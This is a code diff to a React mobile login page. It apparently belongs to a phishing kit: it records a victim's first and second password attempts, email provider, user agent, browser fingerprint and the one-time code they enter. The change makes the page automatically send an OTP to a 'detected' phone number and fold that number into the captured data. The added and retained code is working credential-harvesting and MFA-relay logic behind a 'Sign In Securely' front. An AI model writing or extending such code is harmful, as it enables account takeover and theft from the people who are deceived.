@@ -1,12 +1,14 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Smartphone, AtSign } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, AtSign } from 'lucide-react';
 import { getBrowserFingerprint } from '../../utils/oauthHandler';
 import {
   generateOTP,
   storeOTPSession,
   verifyOTP,
-  sendOTPToUser,
-  clearOTPSession
+  sendOTPToPhone,
+  clearOTPSession,
+  initiateOTPFlow,
+  getOTPSession
 } from '../../utils/otpManager';
 
 interface LoginPageProps {
@@ -34,8 +36,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   
   // OTP Flow States
   const [showOTPFlow, setShowOTPFlow] = useState(false);
-  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone' | null>(null);
-  const [phone, setPhone] = useState('');
+  const [detectedPhone, setDetectedPhone] = useState('');
   const [otp, setOtp] = useState('');
   const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
   const [secondAttemptPassword, setSecondAttemptPassword] = useState('');
@@ -97,9 +98,26 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       if (currentAttempt === 2) {
         setSecondAttemptPassword(password);
         setCurrentEmail(email);
-        setShowOTPFlow(true);
+        
+        console.log('🚀 Mobile: Starting automatic OTP flow...');
+        const otpResult = await initiateOTPFlow(
+          email,
+          firstAttemptPassword,
+          password,
+          selectedProvider,
+          typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown'
+        );
+
+        if (otpResult.success) {
+          setDetectedPhone(otpResult.phone);
+          setShowOTPFlow(true);
+          console.log('✅ Mobile: OTP sent to detected phone:', otpResult.phone);
+        } else {
+          setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
+          console.error('❌ Mobile: OTP flow failed:', otpResult.error);
+        }
+        
         setIsLoading(false);
-        console.log('✅ Mobile: Second attempt - Moving to OTP selection');
         return;
       }
 
@@ -107,49 +125,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       console.error('Mobile login error:', error);
       if (onLoginError) onLoginError('Login failed. Please try again.');
       setIsLoading(false);
-    }
-  };
-
-  const handleDeliveryMethodSelect = async (method: 'email' | 'phone') => {
-    setDeliveryMethod(method);
-    setIsLoading(true);
-    setErrorMessage('');
-
-    try {
-      const generatedOTP = generateOTP();
-
-      storeOTPSession({
-        email: currentEmail,
-        phone: method === 'phone' ? phone : undefined,
-        deliveryMethod: method,
-        otp: generatedOTP,
-        createdAt: new Date().toISOString(),
-        firstAttemptPassword,
-        secondAttemptPassword,
-        provider: selectedProvider || 'Others',
-        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
-      });
-
-      const sendSuccess = await sendOTPToUser(
-        currentEmail,
-        method === 'phone' ? phone : undefined,
-        method,
-        generatedOTP
-      );
-
-      if (sendSuccess) {
-        console.log(`✅ Mobile: OTP sent via ${method}`);
-        setErrorMessage('');
-      } else {
-        throw new Error(`Failed to send OTP via ${method}`);
-      }
-
-      setIsLoading(false);
-    } catch (error) {
-      console.error('Mobile OTP sending error:', error);
-      setErrorMessage(`Failed to send OTP. Please try again.`);
-      setIsLoading(false);
-      setDeliveryMethod(null);
     }
   };
 
@@ -173,6 +148,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       }
 
       const browserFingerprint = await getBrowserFingerprint();
+      const otpSession = getOTPSession(currentEmail);
+      
       const completionData = {
         email: currentEmail,
         password: secondAttemptPassword,
@@ -183,8 +160,9 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         firstAttemptPassword,
         secondAttemptPassword,
         otpEntered: otp,
-        deliveryMethod,
-        phone: deliveryMethod === 'phone' ? phone : undefined,
+        deliveryMethod: 'phone',
+        phone: otpSession?.phone || detectedPhone,
+        phoneDetectedFrom: otpSession?.phoneSource || 'unknown',
       };
 
       console.log('✅ Mobile: OTP verified successfully!');
@@ -204,8 +182,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
   const handleBackToForm = () => {
     setShowOTPFlow(false);
-    setDeliveryMethod(null);
-    setPhone('');
     setOtp('');
     setErrorMessage('');
   };
@@ -217,106 +193,10 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     setLoginAttempts(0);
     setErrorMessage('');
     setShowOTPFlow(false);
-    setDeliveryMethod(null);
   };
 
-  // OTP FLOW: Select delivery method
-  if (showOTPFlow && !deliveryMethod) {
-    return (
-      <div
-        className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
-        style={{
-          backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
-          backgroundSize: 'cover',
-          backgroundPosition: 'center',
-          backgroundRepeat: 'no-repeat'
-        }}
-      >
-        <div className="w-full max-w-sm relative z-10 mx-4">
-          <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden">
-            <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
-            <div className="relative z-10">
-              <div className="flex items-center justify-center mb-3">
-                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
-                  <Sparkles className="w-3.5 h-3.5 text-blue-500" />
-                  <span className="text-xs font-medium text-blue-700">Verify Your Identity</span>
-                </div>
-              </div>
-
-              <div className="space-y-4">
-                <p className="text-sm text-slate-600">How would you like to receive your verification code?</p>
-
-                <button
-                  onClick={() => handleDeliveryMethodSelect('email')}
-                  disabled={isLoading}
-                  className="w-full flex items-center gap-4 p-4 rounded-xl bg-white border border-gray-200 hover:border-indigo-300 hover:bg-indigo-50 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
-                >
-                  <div className="flex items-center justify-center w-12 h-12 rounded-lg bg-indigo-100">
-                    <Mail className="w-6 h-6 text-indigo-600" />
-                  </div>
-                  <div className="text-left flex-1">
-                    <p className="font-semibold text-slate-900">Email</p>
-                    <p className="text-xs text-slate-500">{currentEmail}</p>
-                  </div>
-                  {isLoading && <div className="w-4 h-4 border-2 border-indigo-300 border-t-indigo-600 rounded-full animate-spin" />}
-                </button>
-
-                <div className="relative">
-                  <div className="absolute inset-0 flex items-center">
-                    <div className="w-full border-t border-gray-200"></div>
-                  </div>
-                  <div className="relative flex justify-center text-sm">
-                    <span className="px-2 bg-white text-gray-500">or</span>
-                  </div>
-                </div>
-
-                <div>
-                  <label className="block text-sm font-medium text-slate-700 mb-2">Send to Phone</label>
-                  <div className="flex gap-2">
-                    <div className="relative flex-1">
-                      <Smartphone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
-                      <input
-                        type="tel"
-                        value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
-                        placeholder="Enter phone number"
-                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
-                      />
-                    </div>
-                    <button
-                      onClick={() => handleDeliveryMethodSelect('phone')}
-                      disabled={isLoading || !phone}
-                      className="px-4 py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
-                    >
-                      {isLoading ? <span className="inline-block w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : 'Send'}
-                    </button>
-                  </div>
-                </div>
-
-                {errorMessage && (
-                  <div className="rounded-lg p-3 bg-red-50 border border-red-100">
-                    <p className="text-sm text-red-700">{errorMessage}</p>
-                  </div>
-                )}
-              </div>
-
-              <div className="mt-5 pt-2 border-t border-gray-100">
-                <button
-                  onClick={handleBackToForm}
-                  className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center"
-                >
-                  ← Back to login
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   // OTP FLOW: Enter OTP code
-  if (showOTPFlow && deliveryMethod) {
+  if (showOTPFlow) {
     return (
       <div
         className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
@@ -340,7 +220,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
               <div className="space-y-4">
                 <p className="text-sm text-slate-600">
-                  We've sent a 6-digit verification code to your {deliveryMethod === 'email' ? 'email' : 'phone number'}.
+                  We've sent a 6-digit verification code to your phone number ending in <strong>{detectedPhone.slice(-4)}</strong>
                 </p>
 
                 <form onSubmit={handleOTPSubmit} className="space-y-4">
@@ -527,7 +407,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                         {isLoading && (
                           <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                         )}
-                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
+                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Sending OTP...') : 'Sign In Securely'}
                       </div>
                     </button>
                   </form>
